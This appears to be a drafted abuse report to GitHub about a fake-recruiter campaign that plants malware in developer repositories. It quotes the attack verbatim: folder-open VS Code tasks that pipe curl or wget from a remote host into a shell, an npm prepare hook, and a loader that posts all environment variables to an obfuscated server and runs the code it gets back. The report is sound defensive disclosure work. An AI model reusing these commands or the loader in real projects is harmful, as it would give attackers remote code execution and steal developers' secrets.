# Abuse report — GitHub Trust & Safety

**Submission target:** https://github.com/contact/report-abuse (select category "I want to report abuse or spam" → "Malware or exploits")
**Report submitter:** (fill in your name / handle)
**Date:** 2026-05-13

---

## Subject

Malicious developer-targeting repositories on GitHub: `AjunaWorkHub/AjunaVerse_MVP` and at least 14 sibling repositories deliver remote-code-execution and credential-theft payloads to developers solicited via fake recruiting outreach. Coordinated multi-org campaign matching publicly-documented "Contagious Interview" / fake-recruiter TTP cluster.

---

## Body (paste into the ticket)

The repository at `https://github.com/AjunaWorkHub/AjunaVerse_MVP` is a developer-targeted social-engineering trap, distributed via fake recruiting outreach. It contains three independent, fully-functional malicious code-execution vectors, any one of which compromises a victim's workstation:

**1. `.vscode/tasks.json` auto-run on folder open** — File at https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/.vscode/tasks.json (blob SHA `998c34f02d94169a546b4c36123d552dd14f985b`). Declares a task with `"runOn": "folderOpen"` and OS-specific commands:

```
"osx":     { "command": "curl -L 'https://vscode-settings-0506.vercel.app/api/settings/mac' | bash" }
"linux":   { "command": "wget -qO- 'https://vscode-settings-0506.vercel.app/api/settings/linux' | sh" }
"windows": { "command": "curl --ssl-no-revoke -L https://vscode-settings-0506.vercel.app/api/settings/windows | cmd" }
```

All output is suppressed (`reveal: silent`, `echo: false`, `focus: false`, `close: true`, `panel: new`). The malicious lines are also padded with ~200 trailing spaces so the commands sit far off the right edge of a single line in any non-wrapping editor — deliberate hide-in-plain-sight obfuscation.

**2. `package.json` `prepare` lifecycle hook** — File at https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/package.json. Sets `"prepare": "node server/server.js"`, which causes the in-repo Express server to launch during ordinary `npm install`. Additionally, all of `start`, `build`, `test`, and `eject` pipe `node server/server.js` into `react-scripts`, ensuring the server runs whichever command a developer follows from the README.

**3. Server boot-time `process.env` exfiltration + `new Function` RCE** — Files at https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/server/routes/api/auth.js (lines 18–36) and https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/server/controllers/auth.js (lines 67–72). On module load, the code POSTs `{ ...process.env }` to a base64-obfuscated URL (committed in `.env` as `AUTH_API=aHR0cHM6Ly9pcC1jb3JlLWFwaS1vbmUudmVyY2VsLmFwcC9hcGk=`, which decodes to `https://ip-core-api-one.vercel.app/api`) and `new Function("require", response.data)(require)`-executes the response. This is unconditional arbitrary Node RCE with the victim user's permissions, plus exfiltration of every environment variable in the victim's shell (cloud, GitHub, npm, etc.).

The verbatim malicious primitive:

```js
const setApiKey = (s) => atob(s);

const verify = (api) =>
  axios.post(api, { ...process.env }, {
    headers: { "x-app-request": "ip-check" }
  });

// at module top level:
verify(setApiKey(process.env.AUTH_API))
  .then((response) => {
    const executor = new Function("require", response.data);
    executor(require);
  });
```

**Coordinated multi-org campaign.** The sibling repository `https://github.com/AetSoftWorkHub/AetSoft_MVP` carries the **bit-identical** `.vscode/tasks.json` (same blob SHA `998c34f02d94169a546b4c36123d552dd14f985b`). The two organizations were created on the same day (2026-04-27) with adjacent GitHub IDs (276264331 and 276275397). The committing user is `https://github.com/GitWorkHub9` (GitHub ID 272514006). A sibling user account `https://github.com/GitWorkHub99` (GitHub ID 213663943) operates ~20 credibility-farming clones of widely-used open-source projects (`llama.cpp`, `prettier`, `angular-cli`, `nuxt.com`, `Xray-core`, etc.) plus a parallel campaign repo `AetSoftVerse`.

GitHub code search confirms ~15 sibling repositories using the identical `verify(setApiKey(process.env.AUTH_API))` and `new Function("require", response.data)` loader pattern:

- AjunaWorkHub/AjunaVerse_MVP
- AetSoftWorkHub/AetSoft_MVP
- roamanbuild/OnyxVerse
- DLabsHungary-Hub9/DLabs-Platform-MVP2
- khaleb-dev/jackpot
- rony1235/Jp-Soccer
- mspkteam/williampotter
- Andrii-888/0gRollplay
- prahaladbelavadi/CoinLocatorDemo
- sky-cook/tokentradingdapp
- WilliamSuhosky/Property-Voting-DApp
- artemus-jarrett/blockchain-voting-system
- TechByteX/NitroGem
- jamesm-dev/NitroGem
- dappfusion/defi-real-estate
- InvescoHub/defi-real-estate

(Some of these may be compromised legitimate accounts; the orgs `AjunaWorkHub`, `AetSoftWorkHub`, `DLabsHungary-Hub9` and users `GitWorkHub9`, `GitWorkHub99` are the highest-confidence attacker-owned identities.)

**Acceptable Use Policy violations.** The repositories violate GitHub's [Acceptable Use Policies](https://docs.github.com/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) — specifically the prohibitions on (a) "directly support[ing] unlawful active attacks or malware campaigns that are causing technical harms," (b) phishing and social engineering, and (c) malware delivery. The base64-obfuscated C2 URL committed in `.env`, the whitespace-hidden shell command in `tasks.json`, and the misleading log strings (`"Aborting mempool scan due to failed API verification."` for a codepath that performs neither mempool scanning nor API verification) establish intent.

**Requested actions.**

1. Take down both repositories: `AjunaWorkHub/AjunaVerse_MVP` and `AetSoftWorkHub/AetSoft_MVP`.
2. Suspend the parent organizations `AjunaWorkHub` (ID 276264331), `AetSoftWorkHub` (ID 276275397), and `DLabsHungary-Hub9`.
3. Suspend the user accounts `GitWorkHub9` (ID 272514006) and `GitWorkHub99` (ID 213663943).
4. Investigate the remaining sibling repositories for the same loader pattern; many may be on compromised legitimate accounts that need recovery rather than suspension.
5. Consider adding the distinctive code strings — `verify(setApiKey(process.env.AUTH_API))`, `new Function("require", response.data)`, `"x-app-request": "ip-check"` — to GitHub's malware-content scanning.

---

## Supporting artifacts

- Full technical analysis: see this incident's [`README.md`](./README.md)
- IOCs in machine-readable form: [`iocs.csv`](./iocs.csv), [`iocs.json`](./iocs.json)
- Detection rules: [`detection-rules.md`](./detection-rules.md)
- Companion abuse report for the Vercel-hosted C2: [`abuse-report-vercel.md`](./abuse-report-vercel.md)

---

## If GitHub T&S asks for proof of "weaponized in the wild"

The campaign is documented by at least six independent third parties:

- `defdone/rtidx-evidence` — `reports/amonixplay-evidence-report.md` (analysis of an earlier sibling)
- `oliver-zehentleitner/technopathy`
- `reymom/portfolio-site` — `content/security/2026-04-15-supply-chain-attack.mdx`
- `nickgallick/perlantir-fleet` — references the campaign in a supply-chain-audit skill
- `S0AndS0/S0AndS0.github.io` — `misc/_scammers/2026-04-10_Larry-Bogie-of-BitAngels-Investment-Group.md`
- `jamesm-dev/NitroGem` — `SECURITY_FINDINGS.md` (captured loader file with annotations)
